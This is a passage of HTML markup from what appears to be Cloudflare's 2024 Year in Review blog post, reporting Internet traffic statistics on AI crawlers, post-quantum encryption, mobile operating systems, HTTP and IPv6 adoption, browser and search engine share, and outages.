Bytespider’s crawling activity trended generally downwards over the course of 2024, with end-of-November activity approximately 80-85% lower than that seen at the start of the year. &lt;a href="https://darkvisitors.com/agents/claudebot"&gt;&lt;u&gt;ClaudeBot&lt;/u&gt;&lt;/a&gt; is Anthropic’s crawler, which downloads training data for its LLMs that power AI products like Claude. Traffic from ClaudeBot appeared to be mostly non-existent through mid-April, except for some small spikes that possibly represent test runs. Traffic became more consistently non-zero starting in late April, but after an early spike, trailed off through the remainder of the year.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7cm0SG0GC36Z3dFu3A6p3J/10a6e32a469984b2083ee0c2ed743d53/traffic_-_AI_bots_--_NEW.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Traffic trends for AI crawlers Bytespider and ClaudeBot in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Traffic trends for the full list of AI bots &amp;amp; crawlers can be found in the &lt;a href="https://radar.cloudflare.com/explorer?dataSet=ai.bots&amp;amp;dt=2024-01-01_2024-12-31"&gt;&lt;u&gt;Cloudflare Radar Data Explorer&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

            &lt;h3&gt;13.0% of TLS 1.3 traffic is using post-quantum encryption.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#13-0-of-tls-1-3-traffic-is-using-post-quantum-encryption"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The term “&lt;a href="https://en.wikipedia.org/wiki/Post-quantum_cryptography"&gt;&lt;u&gt;post-quantum&lt;/u&gt;&lt;/a&gt;” refers to a new set of cryptographic techniques designed to protect data from adversaries that have the ability to capture and store current data for decryption by sufficiently powerful quantum computers in the future. The Cloudflare Research team has been &lt;a href="https://blog.cloudflare.com/sidh-go/"&gt;&lt;u&gt;exploring post-quantum cryptography since 2017&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;In October 2022, we enabled &lt;a href="https://blog.cloudflare.com/post-quantum-for-all/"&gt;&lt;u&gt;post-quantum key agreement&lt;/u&gt;&lt;/a&gt; on our network by default, but use of it requires that browsers and clients support it as well. In 2024, Google's &lt;a href="https://developer.chrome.com/release-notes/124"&gt;&lt;u&gt;Chrome 124&lt;/u&gt;&lt;/a&gt; enabled it by default on April 17, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024#post-quantum-encryption"&gt;&lt;u&gt;adoption grew rapidly following that release&lt;/u&gt;&lt;/a&gt;, increasing from just over 2% of requests to around 12% within a month, and ended November at 13%. We expect that adoption will continue to grow into and during 2025 due to support in other Chromium-based browsers, growing default support in Mozilla Firefox, and initial testing in Apple Safari.&lt;/p&gt;
          &lt;figure&gt;

            &lt;h3&gt;Globally, nearly one-third of mobile device traffic was from Apple iOS devices. Android had a &amp;gt;90% share of mobile device traffic in 29 countries/regions; peak iOS mobile device traffic share was over 60% in eight countries/regions.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-one-third-of-mobile-device-traffic-was-from-apple-ios-devices-android-had-a-90-share-of-mobile-device-traffic-in-29-countries-regions-peak-ios-mobile-device-traffic-share-was-over-60-in-eight-countries-regions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The two leading mobile device operating systems globally are &lt;a href="https://en.wikipedia.org/wiki/IOS"&gt;&lt;u&gt;Apple’s iOS&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/Android_(operating_system)"&gt;&lt;u&gt;Google’s Android&lt;/u&gt;&lt;/a&gt;, and by analyzing information in the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;user agent&lt;/u&gt;&lt;/a&gt; reported with each request, we can get insight into the distribution of traffic by client operating system throughout the year. Again, we found that Android is responsible for the majority of mobile device traffic when aggregated globally, due to the wide distribution of price points, form factors, and capabilities.&lt;/p&gt;&lt;p&gt;Similar to &lt;a href="https://radar.cloudflare.com/year-in-review/2023#ios-vs-android"&gt;&lt;u&gt;2023’s findings&lt;/u&gt;&lt;/a&gt;, Android was once again &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ios-vs-android"&gt;&lt;u&gt;responsible for just over two-thirds of mobile device traffic&lt;/u&gt;&lt;/a&gt;. Looking at the top countries for Android traffic, we find a greater than 95% share in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sd#ios-vs-android"&gt;&lt;u&gt;Sudan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/bd#ios-vs-android"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/tm#ios-vs-android"&gt;&lt;u&gt;Turkmenistan&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mw#ios-vs-android"&gt;&lt;u&gt;Malawi&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/pg#ios-vs-android"&gt;&lt;u&gt;Papua New Guinea&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/sy#ios-vs-android"&gt;&lt;u&gt;Syria&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ye#ios-vs-android"&gt;&lt;u&gt;Yemen&lt;/u&gt;&lt;/a&gt;, up from just two countries in 2023. Similar to last year, we again found that countries/regions with higher levels of Android usage are largely in Africa, Oceania/Asia, and South America, and that many have lower levels of &lt;a href="https://ourworldindata.org/grapher/gross-national-income-per-capita?tab=table"&gt;&lt;u&gt;gross national income per capita&lt;/u&gt;&lt;/a&gt;. In these countries/regions, the availability of lower priced “budget” Android devices supports increased adoption.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global distribution of mobile device traffic by operating system in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;In contrast, iOS adoption tops out in the 65% range in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/je#ios-vs-android"&gt;&lt;u&gt;Jersey&lt;/u&gt;&lt;/a&gt;, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/fo#ios-vs-android"&gt;&lt;u&gt;Faroe Islands&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gg#ios-vs-android"&gt;&lt;u&gt;Guernsey&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/dk#ios-vs-android"&gt;&lt;u&gt;Denmark&lt;/u&gt;&lt;/a&gt;. Adoption rates of 50% or more were seen in a total of 26 countries/regions, including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/no#ios-vs-android"&gt;&lt;u&gt;Norway&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/se#ios-vs-android"&gt;&lt;u&gt;Sweden&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/au#ios-vs-android"&gt;&lt;u&gt;Australia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/jp#ios-vs-android"&gt;&lt;u&gt;Japan&lt;/u&gt;&lt;/a&gt;, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024/us#ios-vs-android"&gt;&lt;u&gt;United States&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ca#ios-vs-android"&gt;&lt;u&gt;Canada&lt;/u&gt;&lt;/a&gt;. These locations likely have a greater ability to afford higher priced devices, owing to their comparatively higher gross national income per capita.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/QCfjlx0TgEotwU2wPm0hE/af1359f249aec86894b681249fe7ee70/adoption_-_Android_iOS_top_5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Countries/regions with the largest share of iOS traffic in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Globally, nearly half of web requests used HTTP/2, with 20.5% using HTTP/3.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-half-of-web-requests-used-http-2-with-20-5-using-http-3"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;HTTP (HyperText Transfer Protocol) is the core protocol that the web relies upon. &lt;a href="https://datatracker.ietf.org/doc/html/rfc1945"&gt;&lt;u&gt;HTTP/1.0&lt;/u&gt;&lt;/a&gt; was first standardized in 1996, &lt;a href="https://www.rfc-editor.org/rfc/rfc2616.html"&gt;&lt;u&gt;HTTP/1.1&lt;/u&gt;&lt;/a&gt; in 1999, and &lt;a href="https://www.rfc-editor.org/rfc/rfc7540.html"&gt;&lt;u&gt;HTTP/2&lt;/u&gt;&lt;/a&gt; in 2015. The most recent version, &lt;a href="https://www.rfc-editor.org/rfc/rfc9114.html"&gt;&lt;u&gt;HTTP/3&lt;/u&gt;&lt;/a&gt;, was completed in 2022, and runs on top of a new transport protocol known as &lt;a href="https://blog.cloudflare.com/the-road-to-quic/"&gt;&lt;u&gt;QUIC&lt;/u&gt;&lt;/a&gt;. By running on top of QUIC, &lt;a href="https://www.cloudflare.com/learning/performance/what-is-http3/"&gt;&lt;u&gt;HTTP/3&lt;/u&gt;&lt;/a&gt; can deliver improved performance by mitigating the effects of packet loss and network changes, as well as establishing connections more quickly. HTTP/3 also provides encryption by default, which mitigates the risk of attacks. &lt;/p&gt;&lt;p&gt;Current versions of desktop and mobile Google Chrome (and Chromium-based variants), Mozilla Firefox, and Apple Safari &lt;a href="https://caniuse.com/?search=http%2F3"&gt;&lt;u&gt;all support HTTP/3 by default&lt;/u&gt;&lt;/a&gt;. Cloudflare makes HTTP/3 &lt;a href="https://developers.cloudflare.com/speed/optimization/protocol/http3/"&gt;&lt;u&gt;available for free&lt;/u&gt;&lt;/a&gt; to all of our customers, although not every customer chooses to enable it.&lt;/p&gt;&lt;p&gt;Analysis of the HTTP version negotiated for each request provides insight into the distribution of traffic by the various versions of the protocol aggregated across the year. (“HTTP/1.x” aggregates requests made over HTTP/1.0 and HTTP/1.1.) At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#http-versions"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, 20.5% of requests in 2024 were made using HTTP/3. Another 29.9% of requests were made over the older HTTP/1.x versions, while HTTP/2 remained dominant, accounting for the remaining 49.6%.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/r7KQkjdsXXEtxHoEkFQbO/efb19d1bbd58bef3d657b96555d70103/adoption_-_HTTP_versions_global.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global distribution of traffic by HTTP version in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Looking at version distribution geographically, we found eight countries/regions sending more than a third of their requests over HTTP/3, with &lt;a href="https://radar.cloudflare.com/year-in-review/2024/re#http-versions"&gt;&lt;u&gt;Reunion&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/lk#http-versions"&gt;&lt;u&gt;Sri Lanka&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mn#http-versions"&gt;&lt;u&gt;Mongolia&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/gr#http-versions"&gt;&lt;u&gt;Greece&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/mk#http-versions"&gt;&lt;u&gt;North Macedonia&lt;/u&gt;&lt;/a&gt; comprising the top five as shown below. Eight other countries/regions, including &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ir#http-versions"&gt;&lt;u&gt;Iran&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/ie#http-versions"&gt;&lt;u&gt;Ireland&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://radar.cloudflare.com/year-in-review/2024/hk#http-versions"&gt;&lt;u&gt;Hong Kong&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cn#http-versions"&gt;&lt;u&gt;China&lt;/u&gt;&lt;/a&gt;, sent more than half of their requests over HTTP/1.x throughout 2024. More than half of requests were made over HTTP/2 in a total of 147 countries/regions.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2Zq4mMgbvw6jT6pb6LLdF7/401b98731302233b6f9674e74196e819/adoption_-_HTTP_versions_top_5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Countries/regions with the largest shares of HTTP/3 traffic in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;React, PHP, and jQuery were among the most popular technologies used to build websites, while Hubspot, Google, and WordPress were among the most popular vendors of supporting services and platforms.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#react-php-and-jquery-were-among-the-most-popular-technologies-used-to-build-websites-while-hubspot-google-and-wordpress-were-among-the-most-popular-vendors-of-supporting-services-and-platforms"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Modern websites and applications are extremely complex, built on and integrating on a mix of frameworks, platforms, services, and tools. In order to deliver a seamless user experience, developers must ensure that all of these components happily coexist with each other. Using &lt;a href="https://radar.cloudflare.com/scan"&gt;&lt;u&gt;Cloudflare Radar’s URL Scanner&lt;/u&gt;&lt;/a&gt;, we again scanned websites associated with the &lt;a href="https://radar.cloudflare.com/domains"&gt;&lt;u&gt;top 5000 domains&lt;/u&gt;&lt;/a&gt; to identify the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#website-technologies"&gt;&lt;u&gt;most popular technologies and services&lt;/u&gt;&lt;/a&gt; used across a dozen different categories. &lt;/p&gt;&lt;p&gt;In looking at core technologies used to build websites, &lt;a href="https://react.dev/"&gt;&lt;u&gt;React&lt;/u&gt;&lt;/a&gt; had a commanding lead over &lt;a href="https://vuejs.org/"&gt;&lt;u&gt;Vue.js&lt;/u&gt;&lt;/a&gt; and other JavaScript frameworks, &lt;a href="https://www.php.net/"&gt;&lt;u&gt;PHP&lt;/u&gt;&lt;/a&gt; was the most popular programming technology, and &lt;a href="https://jquery.com/"&gt;&lt;u&gt;jQuery&lt;/u&gt;&lt;/a&gt;’s share was 10x other popular JavaScript libraries.&lt;/p&gt;&lt;p&gt;Third-party services and platforms are also used by websites and applications to support things like analytics, content management, and marketing automation. Google Analytics remained the most widely used analytics provider, WordPress had a greater than 50% share among content management systems, and for marketing automation providers, category leader HubSpot had nearly twice the usage share of Marketo and MailChimp.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2fJS1OpqRlVCsZ9VOXdU89/c01320ff9d20da4ad2471de780a86033/adoption_-_top_website_technologies.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Top website technologies, JavaScript frameworks category in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Go surpassed NodeJS as the most popular language used for making automated API requests.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#go-surpassed-nodejs-as-the-most-popular-language-used-for-making-automated-api-requests"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Many dynamic websites and applications are built on &lt;a href="https://blog.cloudflare.com/2024-api-security-report/"&gt;&lt;u&gt;automated API calls&lt;/u&gt;&lt;/a&gt;, and we can use our unique visibility into Web traffic to identify the top languages these API clients are written in. Applying heuristics to API-related requests determined to not be coming from a person using a browser or native mobile application helps us to identify the language used to build the API client.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#api-client-language-popularity"&gt;&lt;u&gt;Our analysis&lt;/u&gt;&lt;/a&gt; found that almost 12% of automated API requests are made by &lt;a href="https://go.dev/"&gt;&lt;u&gt;Go&lt;/u&gt;&lt;/a&gt;-based clients, with &lt;a href="https://nodejs.org/en/"&gt;&lt;u&gt;NodeJS&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.python.org/"&gt;&lt;u&gt;Python&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.java.com/"&gt;&lt;u&gt;Java&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://dotnet.microsoft.com/"&gt;&lt;u&gt;.NET&lt;/u&gt;&lt;/a&gt; holding smaller shares. Compared to &lt;a href="https://radar.cloudflare.com/year-in-review/2023#api-client-language-popularity"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;, Go’s share increased by approximately 40%, allowing it to capture the top spot, while NodeJS’s share fell by just over 30%. Python and Java also saw their shares increase, while .NET’s fell.&lt;/p&gt;
          &lt;figure&gt;

          &lt;div&gt;
            &lt;h3&gt;Google is the most popular search engine globally, across all platforms. On mobile devices/OS, Baidu is a distant second. Bing is a distant second across desktop and Windows devices, with DuckDuckGo second most popular on macOS. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-is-the-most-popular-search-engine-globally-across-all-platforms-on-mobile-devices-os-baidu-is-a-distant-second-bing-is-a-distant-second-across-desktop-and-windows-devices-with-duckduckgo-second-most-popular-on-macos"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Protecting and accelerating websites and applications for millions of customers, Cloudflare is in a unique position to measure search engine market share data. Our methodology uses HTTP’s &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer"&gt;&lt;u&gt;referer header&lt;/u&gt;&lt;/a&gt; to identify the search engine sending traffic to customer sites and applications. The market share data is presented as an overall aggregate, as well as broken out by device type and operating system. (Device type and operating system data is derived from the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;User-Agent&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Client_hints"&gt;&lt;u&gt;Client Hints&lt;/u&gt;&lt;/a&gt; headers accompanying a content request.)&lt;/p&gt;&lt;p&gt;Aggregated at a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#search-engine-market-share"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, Google referred the most traffic to Cloudflare customers, with a greater than 88% share across 2024. Yandex, Baidu, Bing, and DuckDuckGo round out the top five, all with single digit percentage shares. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7bwTSu9NktZ9chotEmTQhs/fd231b3f13fe4709ca7480546276d2e0/adoption_-_search_engine_overall_worldwide.png" /&gt;

For example, in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/kr#search-engine-market-share"&gt;&lt;u&gt;South Korea&lt;/u&gt;&lt;/a&gt;, Google is responsible for only two-thirds of referrals, while local platform &lt;a href="https://www.naver.com/"&gt;&lt;u&gt;Naver&lt;/u&gt;&lt;/a&gt; drives 29.2%, with local portal &lt;a href="https://www.daum.net/"&gt;&lt;u&gt;Daum&lt;/u&gt;&lt;/a&gt; also in the top five at 1.3%.&lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Overall search engine market share in South Korea in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Google’s dominance is also blunted a bit on Windows devices, where it drives only 80% of referrals globally. Unsurprisingly, Bing holds the second spot for Windows users, with a 10.4% share. Yandex, Yahoo, and DuckDuckGo round out the top 5, all with shares below 5%.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4sKOs50fTPbchv55J7gQrM/1ce8b0c1287bbd5b35d9e987e2061207/adoption_-_search_engine_overall_worldwide_Windows.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Overall worldwide search engine market share for Windows devices in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;For additional details, including search engines aggregated under “Other”, please refer to the quarterly &lt;a href="https://radar.cloudflare.com/reports/search-engines"&gt;&lt;u&gt;Search Engine Referral Reports&lt;/u&gt;&lt;/a&gt; on Cloudflare Radar.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Google Chrome is the most popular browser overall. While also true on MacOS devices, Safari usage is well ahead of Chrome on iOS devices. On Windows, Edge is the second most popular browser. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-chrome-is-the-most-popular-browser-overall-while-also-true-on-macos-devices-safari-usage-is-well-ahead-of-chrome-on-ios-devices-on-windows-edge-is-the-second-most-popular-browser"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Similar to our ability to measure search engine market share, Cloudflare is also in a unique position to measure browser market share. Our methodology uses information from the &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent"&gt;&lt;u&gt;User-Agent&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Client_hints"&gt;&lt;u&gt;Client Hints&lt;/u&gt;&lt;/a&gt; headers to identify the browser making content requests, along with the associated operating system. Browser market share data is presented as an overall aggregate, as well as broken out by device type and operating system. Note that the shares of browsers available on both desktop and mobile devices, such as Chrome or Safari, are presented in aggregate.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#browser-market-share"&gt;&lt;u&gt;Globally&lt;/u&gt;&lt;/a&gt;, we found that 65.8% of requests came from Google’s Chrome browser across 2024, and that just 15.5% came from Apple’s Safari browser. Microsoft Edge, Mozilla Firefox, and the &lt;a href="https://www.samsung.com/us/support/owners/app/samsung-internet"&gt;&lt;u&gt;Samsung Internet browser&lt;/u&gt;&lt;/a&gt; rounded out the top five, all with shares below 10%.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1bEuEbqSrAqe57gnBTeL6c/4426dc0dbc8869d05344433535e0698a/adoption_-_browser_overall_worldwide.png" /&gt;

In some countries where iOS holds a larger market share than Android, Chrome remains the leading browser, but by a much lower margin. For example, in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/se#browser-market-share"&gt;&lt;u&gt;Sweden&lt;/u&gt;&lt;/a&gt;, Chrome’s share fell to 56.2%, while Safari’s increased to 22.5%. In &lt;a href="https://radar.cloudflare.com/year-in-review/2024/no#browser-market-share"&gt;&lt;u&gt;Norway&lt;/u&gt;&lt;/a&gt;, Chrome fell to just 50%, while Safari grew to 25.6%.&lt;/p&gt;

            &lt;h3&gt;225 major Internet outages were observed around the world in 2024, with many due to government-directed regional and national shutdowns of Internet connectivity.&lt;/h3&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Throughout 2024, as we have over the last several years, we have written frequently about observed Internet outages, whether due to &lt;a href="https://blog.cloudflare.com/east-african-internet-connectivity-again-impacted-by-submarine-cable-cuts"&gt;&lt;u&gt;cable cuts&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/impact-of-verizons-september-30-outage-on-internet-traffic/"&gt;&lt;u&gt;unspecified technical issues&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/syria-iraq-algeria-exam-internet-shutdown"&gt;&lt;u&gt;government-directed shutdowns&lt;/u&gt;&lt;/a&gt;, or a number of other reasons covered in our quarterly summary posts (&lt;a href="https://blog.cloudflare.com/q1-2024-internet-disruption-summary"&gt;&lt;u&gt;Q1&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/q2-2024-internet-disruption-summary"&gt;&lt;u&gt;Q2&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary"&gt;&lt;u&gt;Q3&lt;/u&gt;&lt;/a&gt;). The impacts of these outages can be significant, including significant economic losses and severely limited communications. The &lt;a href="https://radar.cloudflare.com/outage-center"&gt;&lt;u&gt;Cloudflare Radar Outage Center&lt;/u&gt;&lt;/a&gt; tracks these Internet outages, and uses Cloudflare traffic data for insights into their scope and duration.&lt;/p&gt;&lt;p&gt;Some of the outages seen through the year were short-lived, lasting just a few hours, while others stretched on for days or weeks. In the latter category, an Internet outage in &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#haiti"&gt;&lt;u&gt;Haiti&lt;/u&gt;&lt;/a&gt; dragged on for eight days in September because repair crews were barred from accessing a damaged submarine cable due to a business dispute, while shutdowns of mobile and fixed Internet providers in &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#bangladesh"&gt;&lt;u&gt;Bangladesh&lt;/u&gt;&lt;/a&gt; lasted for approximately 10 days in July. In the former category, &lt;a href="https://blog.cloudflare.com/q3-2024-internet-disruption-summary/#iraqi-kurdistan"&gt;&lt;u&gt;Iraq&lt;/u&gt;&lt;/a&gt; frequently experienced multi-hour nationwide Internet shutdowns intended to prevent cheating on academic exams — these contribute to the clustering visible in the timeline during June, July, August, and September.&lt;/p&gt;&lt;p&gt;Within the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#internet-outages"&gt;&lt;u&gt;timeline&lt;/u&gt;&lt;/a&gt; on the Year in Review microsite, hovering over a dot will display metadata about that outage, and clicking on it will open a page with additional information.

            &lt;h3&gt;Aggregated across 2024, 28.5% of IPv6-capable requests were made over IPv6. India and Malaysia were the strongest countries, at 68.9% and 59.6% IPv6 adoption respectively.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#aggregated-across-2024-28-5-of-ipv6-capable-requests-were-made-over-ipv6-india-and-malaysia-were-the-strongest-countries-at-68-9-and-59-6-ipv6-adoption-respectively"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The IPv4 protocol still used by many Internet-connected devices was developed in the 1970s, and was never meant to handle the vast and growing scale of the modern Internet. An &lt;a href="https://www.rfc-editor.org/rfc/rfc1883"&gt;&lt;u&gt;initial specification for its successor&lt;/u&gt;&lt;/a&gt;, IPv6, was published in December 1995, evolving to a &lt;a href="https://www.rfc-editor.org/rfc/rfc2460"&gt;&lt;u&gt;draft standard&lt;/u&gt;&lt;/a&gt; three years later, offering an expanded address space intended to better support the expected growth in the number of Internet-connected devices. At this point, available IPv4 space has long since been &lt;a href="https://ipv4.potaroo.net/"&gt;&lt;u&gt;exhausted&lt;/u&gt;&lt;/a&gt;, and connectivity providers use solutions like &lt;a href="https://en.wikipedia.org/wiki/Network_address_translation"&gt;&lt;u&gt;Network Address Translation&lt;/u&gt;&lt;/a&gt; to stretch limited IPv4 resources. Hungry for IPv4 address space as their businesses and infrastructure grow, cloud and hosting providers are acquiring blocks of IPv4 address space for &lt;a href="https://auctions.ipv4.global/"&gt;&lt;u&gt;as much as \$30 - \$50 per address&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;Cloudflare has been a vocal and active advocate for IPv6 since 2011, when we announced our &lt;a href="https://blog.cloudflare.com/introducing-cloudflares-automatic-ipv6-gatewa/"&gt;&lt;u&gt;Automatic IPv6 Gateway&lt;/u&gt;&lt;/a&gt;, which enabled free IPv6 support for all of our customers. In 2014, we enabled &lt;a href="https://blog.cloudflare.com/i-joined-cloudflare-on-monday-along-with-5-000-others"&gt;&lt;u&gt;IPv6 support by default for all of our customers&lt;/u&gt;&lt;/a&gt;, but not all customers choose to keep it enabled for a variety of reasons. Note that server-side support is only half of the equation for driving IPv6 adoption, as end user connections need to support it as well. (In reality, it is a bit more complex than that, but server and client side support across applications, operating systems, and network environments are the two primary requirements. From a network perspective, implementing IPv6 also brings a number of other &lt;a href="https://www.catchpoint.com/benefits-of-ipv6"&gt;&lt;u&gt;benefits&lt;/u&gt;&lt;/a&gt;.) By analyzing the IP version used for each request made to Cloudflare, aggregated throughout the year, we can get insight into the distribution of traffic by the various versions of the protocol.&lt;/p&gt;&lt;p&gt;At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#ipv6-adoption"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level, 28.5% of IPv6-capable (“&lt;a href="https://www.techopedia.com/definition/19025/dual-stack-network"&gt;&lt;u&gt;dual-stack&lt;/u&gt;&lt;/a&gt;”) requests were made over IPv6, up from 26.4% in &lt;a href="https://radar.cloudflare.com/year-in-review/2024?previousYear=true"&gt;&lt;u&gt;2023&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://radar.cloudflare.com/year-in-review/2024/in#ipv6-adoption"&gt;&lt;u&gt;India&lt;/u&gt;&lt;/a&gt; was again the country with the highest level of IPv6 adoption, at 68.9%, carried in large part by &lt;a href="https://radar.cloudflare.com/adoption-and-usage/as55836?dateStart=2024-01-01&amp;amp;dateEnd=2024-12-01"&gt;&lt;u&gt;94% IPv6 adoption at Reliance Jio&lt;/u&gt;&lt;/a&gt;, one of the country’s largest Internet service providers. India was followed closely by &lt;a 